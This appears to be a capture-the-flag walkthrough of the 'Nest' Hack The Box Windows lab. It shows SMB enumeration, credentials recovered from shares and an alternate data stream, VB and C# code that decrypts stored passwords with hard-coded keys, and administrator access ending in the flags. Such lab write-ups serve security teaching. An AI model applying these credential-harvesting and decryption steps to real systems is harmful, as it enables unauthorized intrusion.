# Nest

## Overview

Nest is an Easy-rated Windows machine that focuses on SMB enumeration, encrypted credentials, and custom service exploitation. The path to compromise involves analyzing Visual Basic and C# source code to decrypt credentials.

## Initial Recon

Let's start with a very basic nmap scan, I usually store the box ip address in an environment variable.

```
nmap $IP
```

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

The TCP port 445 is open, so we can try to connect to the box using smbclient.

### SMB

```
smbclient -L //$IP
```

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk
	IPC$            IPC       Remote IPC
	Secure$         Disk
	Users           Disk
```

A few shares are available. Let's try to enumerate some of them as an unauthicated user
We don't have access any of the shares except `Data`, `Secure$` and `Users`.  
In the `Secure$` share, the `ls` command is forbidden.  
In the `Users` share, we can see multiple user directories, but we don't have access to any of them.  
Owever, in the `Data` share  (`smbclient -N //$IP/Data`), we find a file called `Welcom Email.txt` in the `Shared\Templates` directory:

```text
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location:
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```

Let's use these credentials using smbclient once again and do some more enumeration in the `Data` share:

```
smbclient //$IP/Users -U TempUser%welcome2019
```

We find a file called `config.xml` in the `\IT\Configs\NotepadPlusPlus` directory with quite a lot of information but only a few lines of interest:

```xml
<History nbMaxFile="15" inSubMenu="no" customLength="-1">
    <File filename="C:\windows\System32\drivers\etc\hosts" />
    <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
    <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
</History>
```

There is also a file called `RU_config.xml` in the `\IT\Configs\RU Scanner` directory with the following content:

```xml
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```

So now we have a few paths and some credentials.  
The first path `C:\windows\System32\drivers\etc\hosts` is not very useful. The third path `C:\Users\C.Smith\Desktop\todo.txt` is interesting, but we don't have access to it.  
The second path `\\HTB-NEST\Secure$\IT\Carl\` is accessible even though we can't list files and directories in the `Secure$\IT` directory.

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 23:08:12 2019
  ..                                  D        0  Wed Aug  7 23:08:12 2019
  Finance                             D        0  Wed Aug  7 19:40:13 2019
  HR                                  D        0  Wed Aug  7 23:08:11 2019
  IT                                  D        0  Thu Aug  8 10:59:25 2019

		5242623 blocks of size 4096. 1839990 blocks available
smb: \> cd IT
smb: \IT\> ls
NT_STATUS_ACCESS_DENIED listing \IT\*
smb: \IT\> cd Carl
smb: \IT\Carl\> ls
  .                                   D        0  Wed Aug  7 19:42:14 2019
  ..                                  D        0  Wed Aug  7 19:42:14 2019
  Docs                                D        0  Wed Aug  7 19:44:00 2019
  Reports                             D        0  Tue Aug  6 13:45:40 2019
  VB Projects                         D        0  Tue Aug  6 14:41:55 2019

		5242623 blocks of size 4096. 1839990 blocks available
```

After some more enumeration, we find a VB project in the following path: `\IT\Carl\VB Projects\WIP\RU\RUScanner\`. A file called `Utils.vb` has some interesting code about encrypting and decrypting strings.  
After extracting some methods and compiling the code, we can pass the string `fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=` to the `DecryptString` method and get the password `xRxRxPANCAK3SxRxRx`.

```vb
Imports System.Text
Imports System.Security.Cryptography
Public Module Program
   Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
   End Function
  
   Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                   ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String
        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))
        
        Using symmetricKey As Aes = Aes.Create()
            symmetricKey.Mode = CipherMode.CBC
            
            Using decryptor As ICryptoTransform = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
                Using memoryStream As New IO.MemoryStream(cipherTextBytes)
                    Using cryptoStream As New CryptoStream(memoryStream, _
                                                    decryptor, _
                                                    CryptoStreamMode.Read)
                        Dim plainTextBytes(cipherTextBytes.Length - 1) As Byte
                        Dim decryptedByteCount As Integer = cryptoStream.Read(plainTextBytes, _
                                                           0, _
                                                           plainTextBytes.Length)
                        Return Encoding.ASCII.GetString(plainTextBytes, _
                                                        0, _
                                                        decryptedByteCount)
                    End Using
                End Using
            End Using
        End Using
    End Function

    Public Sub Main(args() As String)
        Dim encryptedText As String = "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="
        Dim decryptedText As String = DecryptString(encryptedText)
            
        Console.WriteLine("Encrypted text: " & encryptedText)
        Console.WriteLine("Decrypted text: " & decryptedText)
    End Sub
End Module
```
```
Encrypted text: fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=
Decrypted text: xRxRxPANCAK3SxRxRx
```

So now we have some new credentials to try: `c.smith` `xRxRxPANCAK3SxRxRx`. Let's explore our new user directory. 

```
smbclient //$IP/Users/ -U c.smith%xRxRxPANCAK3SxRxRx
````
```
Try "help" to get a list of possible commands.
smb: \> cd C.Smith\
ls
smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 07:21:44 2020
  ..                                  D        0  Sun Jan 26 07:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 23:06:17 2019
  user.txt                            A       34  Sat Jan 11 10:22:07 2025

		5242623 blocks of size 4096. 1839990 blocks available
```

In `user.txt` is out first flag for this box. In the `HQK Reporting` directory, we find a file called `HQK_Config_Backup.xml` with the following content:

```xml
<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>
```

The interesting part here is the port number `4386`, we'll keep that in mind for later.
There is also in this directory a file called `Debug Mode Password.txt` of 0 bytes. By digging a little deeper using the `allinfo` command, we get this output:

```
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 23:06:12 2019 UTC
access_time:    Thu Aug  8 23:06:12 2019 UTC
write_time:     Thu Aug  8 23:08:17 2019 UTC
change_time:    Wed Jul 21 18:47:12 2021 UTC
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
```

We can see a stream called `Password:$DATA` with 15 bytes of data. After getting this stream we get this content: ```WBQ201953D8w```.

One last thing to note, the directory also contains another directory called `AD Integration Module` with an exe file called `HqkLdap.exe`. This file will be useful later.

## HQK

With the last config file we found, we have a hint that some service we still need to find is running on port `4386`.

```
telnet $IP 4386
```
```
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>
```

We land on some sort of a shell, we can use `HELP` to get a list of available commands.

```
>help
```
```
This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
```

Let's try some commands to see if we can get some information about the system.

```
>LIST

Use the query ID numbers below with the `RUNQUERY` command and the directory names with the `SETDIR` command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>RUNQUERY 1

Invalid database configuration found. Please contact your system administrator
>SETDIR ..

Current directory set to HQK
>LIST

Use the query ID numbers below with the `RUNQUERY` command and the directory names with the `SETDIR` command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
```

At this point, the `RUNQUERY` command is never working. The `SETDIR` command allows to move freely in the filesystem but we have no way to print file's content.  
The next thing we can try is to use the `DEBUG` command as we possibly found the password in the `Debug Mode Password.txt` file.

```
>DEBUG WBQ201953D8w
```
```
Debug mode enabled. Use the HELP command to view additional commands that are now available
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
```

So we have a few more commands available. The one that is gonna be useful is the `SHOWQUERY` command.
Let's try a `SHOWQUERY` on the `3` query available in our current directory.

```
>LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>SHOWQUERY 3

<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <DebugPassword>WBQ201953D8w</DebugPassword>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>
```

We got the content of the `HQK_Config.xml` file. Now that we can print the content of the file, let's try to find some interesting information in this filesystem.  
There is an `LDAP` directory available, so let's try to find some information inside it.

```
>SETDIR LDAP

Current directory set to LDAP
>LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
>SHOWQUERY 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

Bingo, we found the password for the `Administrator` user. However, the password is encrypted and we need to find a way to decrypt it.

## HqkLdap.exe decompilation

Let's see what's inside the `HqkLdap.exe` file we discovered earlier, the naming is a good hint.
As earlier with the `RU Scanner` VB project, we can quickly see a `CR` class with a few methods like `DS` and `RD` calling a bunch of methods from the `System.Security.Cryptography` namespace.
Extracting these methods and compiling them, we can get the following code:

```csharp
// Online C# Editor for free
// Write, Edit and Run your C# code using C# Online Compiler

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class HelloWorld
{
    public static string DS(string EncryptedString)
    {
      return string.IsNullOrEmpty(EncryptedString) ? string.Empty : RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
    }
    
    private static string RD(
      string cipherText,
      string passPhrase,
      string saltValue,
      int passwordIterations,
      string initVector,
      int keySize)
    {
      byte[] bytes1 = Encoding.ASCII.GetBytes(initVector);
      byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
      byte[] buffer = Convert.FromBase64String(cipherText);
      byte[] bytes3 = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations).GetBytes(checked ((int) Math.Round(unchecked ((double) keySize / 8.0))));
      AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider();
      cryptoServiceProvider.Mode = CipherMode.CBC;
      ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(bytes3, bytes1);
      MemoryStream memoryStream = new MemoryStream(buffer);
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
      byte[] numArray = new byte[checked (buffer.Length + 1)];
      int count = cryptoStream.Read(numArray, 0, numArray.Length);
      memoryStream.Close();
      cryptoStream.Close();
      return Encoding.ASCII.GetString(numArray, 0, count);
    }
    
    public static void Main(string[] args)
    {
        Console.WriteLine (DS("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="));
    }
}
````
````
XtH4nkS4Pl4y1nGX
````

Giving us the decypted password: `XtH4nkS4Pl4y1nGX`.

As we did before, let's use these credentials to login with smbclient.

```
smbclient //$IP/Users/ -U Administrator%XtH4nkS4Pl4y1nGX
```

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 23:04:21 2020
  ..                                  D        0  Sat Jan 25 23:04:21 2020
  Administrator                       D        0  Fri Aug  9 15:08:23 2019
  C.Smith                             D        0  Sun Jan 26 07:21:44 2020
  L.Frost                             D        0  Thu Aug  8 17:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 17:02:50 2019
  TempUser                            D        0  Wed Aug  7 22:55:56 2019

		5242623 blocks of size 4096. 1839990 blocks available
smb: \> cd Administrator
smb: \Administrator\> ls
  .                                   D        0  Fri Aug  9 15:08:23 2019
  ..                                  D        0  Fri Aug  9 15:08:23 2019
  flag.txt - Shortcut.lnk             A     2384  Fri Aug  9 15:10:15 2019

		5242623 blocks of size 4096. 1839990 blocks available
```

We can find on the Administrator directory a shortcut to the `flag.txt` file. Reading this shortcut's content gives us the actual path: `\\Htb-nest\c$\Users\Administrator\Desktop\flag.txt`. Let's try to read this file.

```
smbclient //$IP/C$/ -U Administrator%XtH4nkS4Pl4y1nGX
```
```
Try "help" to get a list of possible commands.
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Wed Jul 21 18:27:44 2021
  ..                                 DR        0  Wed Jul 21 18:27:44 2021
  desktop.ini                       AHS      282  Sat Jan 25 22:02:44 2020
  root.txt                           AR       34  Sat Jan 11 10:22:07 2025

		5242623 blocks of size 4096. 1839990 blocks available
```

Our final flag is in the `root.txt` file.
